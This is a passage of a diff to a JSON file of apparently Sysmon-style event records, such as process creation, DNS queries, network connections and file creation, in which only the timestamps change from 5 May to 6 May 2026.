         "event_id": "7",
-        "timestamp": "2026-05-05T17:01:02.010403+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -569,7 +569,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-05T17:01:02.010403+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -583,7 +583,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-05T17:01:02.012401+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -597,7 +597,7 @@
       "properties": {
         "action": "DNS Query",
         "event_id": "22",
-        "timestamp": "2026-05-05T17:01:02.014470+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -611,7 +611,7 @@
       "properties": {
         "action": "DNS Query",
         "event_id": "22",
-        "timestamp": "2026-05-05T17:01:02.018008+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -625,7 +625,7 @@
       "properties": {
         "action": "Network Connection",
         "event_id": "3",
-        "timestamp": "2026-05-05T17:01:02.019015+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -639,7 +639,7 @@
       "properties": {
         "action": "FileCreateStreamHash",
         "event_id": "15",
-        "timestamp": "2026-05-05T17:01:02.026529+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -653,7 +653,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-05T17:01:02.027706+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -667,7 +667,7 @@
       "properties": {
         "action": "FileCreateStreamHash",
         "event_id": "15",
-        "timestamp": "2026-05-05T17:01:02.027706+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -681,7 +681,7 @@
       "properties": {
         "action": "File Create",
         "event_id": "11",
-        "timestamp": "2026-05-05T17:01:02.028717+00:00"
+        "timestamp": "2026-05-06T14:33:26.248867+00:00"
       }
     },
     {
@@ -695,7 +695,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-05T17:01:02.042130+00:00"
+        "timestamp": "2026-05-06T14:33:26.266401+00:00"
       }
     },
     {
@@ -709,7 +709,7 @@
       "properties": {
         "action": "Network Connection",
         "event_id": "3",
-        "timestamp": "2026-05-05T17:01:02.043130+00:00"
+        "timestamp": "2026-05-06T14:33:26.266401+00:00"
       }
     },
     {
@@ -723,7 +723,7 @@
       "properties": {
         "action": "DNS Query",
         "event_id": "22",
-        "timestamp": "2026-05-05T17:01:02.043130+00:00"
+        "timestamp": "2026-05-06T14:33:26.266401+00:00"
       }
     },
     {
@@ -737,7 +737,7 @@
       "properties": {
         "action": "DNS Query",
         "event_id": "22",
-        "timestamp": "2026-05-05T17:01:02.045719+00:00"
+        "timestamp": "2026-05-06T14:33:26.266401+00:00"
       }
     },
     {
@@ -751,7 +751,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-05T17:01:02.067535+00:00"
+        "timestamp": "2026-05-06T14:33:26.296250+00:00"
       }
     },
     {
@@ -765,7 +765,7 @@
       "properties": {
         "action": "ProcessAccess",
         "event_id": "10",
-        "timestamp": "2026-05-05T17:01:02.076424+00:00"
+        "timestamp": "2026-05-06T14:33:26.296250+00:00"
       }
     },
     {
@@ -779,7 +779,7 @@
       "properties": {
         "action": "Process Create",
         "event_id": "1",
-        "timestamp": "2026-05-05T17:01:02.079038+00:00"
+        "timestamp": "2026-05-06T14:33:26.296250+00:00"
       }
     },
     {
